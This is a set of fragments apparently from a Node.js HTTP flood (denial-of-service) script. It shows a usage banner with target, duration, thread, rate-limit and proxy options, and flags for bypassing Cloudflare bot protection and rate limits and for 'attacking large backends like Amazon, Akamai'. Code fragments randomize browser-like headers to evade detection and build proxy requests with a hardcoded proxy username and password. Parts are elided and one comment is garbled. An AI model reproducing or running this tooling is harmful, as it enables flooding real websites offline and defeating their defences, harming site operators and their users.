...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    [1;36mHow to use & example:[0m
    
    node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
    
    [1;36mOptions:[0m
    
     --query 1/2/3 - select query string with rand; e.g., 1 for ?cf__chl_tk, 2 for ?fwfwfwfw, 3 for q?=fwfwwffw
     --delay <1-1000> - set delay between requests from 1-100 ms (optimal); default is 1 ms
     --cookie "f=f" - specify custom cookie if necessary
     --bfm true/null - enable bot fight mode by setting it to true
     --referer https://target.com / rand - use a custom referer if needed; choose rand to generate domains, e.g., fwfwwfwfw.net
     --postdata "user=f&pass=%RAND%" - include data for the POST request method in the format "user=f&pass=f"
     --randrate - adjust randomizer rate from 1 to 90 for effective rate limiting bypass
     --full - this new feature is designed for attacking large backends like Amazon, Akamai, etc.; supports Cloudflare
     --http 1/2/mix - new function to specify the type of HTTP (1, 2, or mix of both)
     --debug - display your status code (may lead to lower requests per second and increased resource usage)
     --header "f:f" or "f:f#f1:f1" - if needed, utilize custom headers; separate each header with #
...
const fwfw = ['Google Chrome', 'Brave']; const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)]; const ref = ["same-site", "same-origin", "cross-site"]; const ref1 = ref[Math.floor(Math.random() * ref.length)];
                    let brandValue;
                    if (browserVersion === 120) {
                        brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 121) {
                        ...
                        const headers = Object.entries({
                            ...
                            ...(Math.random() < 0.1 && { "cache-control": "max-age=0" }),
...
...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                        ...
                        }).filter(a => a[1] != null)); // ???? ???????? ??? rand ? cookie ? cf clearence ??????????
...
for (let i = headers2.length - 1; i > 0; i--) {
    ...
    [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
        ...
        `Host: ${url.host}:443\r\n` +
        `Proxy-Authorization: Basic ${Buffer.from(`mix28158MF1UR:ppvm4H4F`).toString('base64')}\r\n` +
